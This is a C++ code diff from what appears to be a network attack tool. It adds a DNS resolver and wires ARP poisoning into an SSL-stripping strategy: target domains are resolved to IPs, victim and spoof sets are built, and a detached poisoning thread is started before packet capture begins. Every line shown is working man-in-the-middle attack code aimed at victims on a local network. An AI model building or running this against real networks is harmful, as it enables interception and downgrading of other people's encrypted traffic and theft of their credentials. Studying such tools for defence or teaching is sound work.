@@ -7,12 +7,88 @@
 #include "PcapLiveDevice.h"
 #include "RawPacket.h"
 #include "TcpLayer.h"
+#include "arp_poisoning/public.h"
 #include "log.h"
+#include "ssl_stripping/public.h"
 #include <algorithm>
 #include <exception>
 #include <future>
 #include <stdexcept>
+#include <thread>
+#include <unordered_set>
 #include <vector>
+
+#ifdef _WIN32
+#include <winsock2.h>
+#include <ws2tcpip.h> // for getaddrinfo, inet_ntop
+#pragma comment(lib, "ws2_32.lib")
+#else
+#include <arpa/inet.h>
+#include <cstring>
+#include <netdb.h>
+#include <unistd.h>
+
+#endif
+
+std::optional<std::unordered_set<std::string>>
+resolveDomainToIP(const std::string &domain) {
+#ifdef _WIN32
+    WSADATA wsaData;
+    int wsaerr = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (wsaerr != 0) {
+        std::cerr << "WSAStartup failed: " << wsaerr << std::endl;
+        return std::nullopt;
+    }
+#endif
+
+    addrinfo hints{};
+    hints.ai_family = AF_UNSPEC; // AF_INET or AF_INET6
+    hints.ai_socktype = SOCK_STREAM;
+
+    addrinfo *res = nullptr;
+    int status = getaddrinfo(domain.c_str(), nullptr, &hints, &res);
+    if (status != 0) {
+#ifdef _WIN32
+        LOG_ERROR("getaddrinfo: " + std::string(gai_strerrorA(status)));
+#else
+        LOG_ERROR("getaddrinfo: " + std::string(gai_strerror(status)));
+#endif
+        return std::nullopt;
+    }
+
+    std::cout << "IP addresses for " << domain << ":\n";
+
+    std::unordered_set<std::string> outputIps;
+    for (addrinfo *currentAddrInfo = res; currentAddrInfo != nullptr;
+         currentAddrInfo = currentAddrInfo->ai_next) {
+        std::array<char, INET6_ADDRSTRLEN> ipstr{};
+
+        void *addr = nullptr;
+        if (currentAddrInfo->ai_family == AF_INET) { // IPv4
+            auto *ipv4 =
+                // NOLINTNEXTLINE(cppcoreguidelines-pro-type-reinterpret-cast)
+                reinterpret_cast<sockaddr_in *>(currentAddrInfo->ai_addr);
+            addr = &(ipv4->sin_addr);
+        } else { // IPv6
+            auto *ipv6 =
+                // NOLINTNEXTLINE(cppcoreguidelines-pro-type-reinterpret-cast)
+                reinterpret_cast<sockaddr_in6 *>(currentAddrInfo->ai_addr);
+            addr = &(ipv6->sin6_addr);
+        }
+
+        inet_ntop(currentAddrInfo->ai_family, addr, ipstr.data(),
+                  sizeof(ipstr));
+        std::cout << "  " << ipstr.data() << "\n";
+        outputIps.insert(ipstr.data());
+    }
+
+    freeaddrinfo(res);
+
+#ifdef _WIN32
+    WSACleanup();
+#endif
+    return outputIps;
+}
 
 void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
     pcpp::RawPacket *packet, pcpp::PcapLiveDevice * /*device*/,
@@ -67,6 +143,27 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
 }
 
 void ATK::SSL::SilentSslStrippingStrategy::execute() {
+    if (mitmStrategy_ == ATK::SSL::MitmStrategy::ARP) {
+        ATK::ARP::SilentPoisoningOptions options;
+        options.ifaceIpOrName = device_->getName();
+        std::unordered_set<std::string> victimIpsSet(victimIps_.begin(),
+                                                     victimIps_.end());
+        options.victimIps = victimIpsSet;
+        std::unordered_set<std::string> ipsToSpoofSet;
+        for (const std::string &domain : domainsToStrip_) {
+            std::optional<std::unordered_set<std::string>> currentIps =
+                resolveDomainToIP(domain);
+            if (currentIps.has_value()) {
+                ipsToSpoofSet.insert(currentIps.value().begin(),
+                                     currentIps.value().end());
+            }
+        }
+        options.ipsToSpoof = ipsToSpoofSet;
+
+        std::thread(ATK::ARP::silentPoison, options).detach();
+    } else {
+    }
+
     if (!device_->open()) {
         throw std::runtime_error("Unable to open interface");
     }
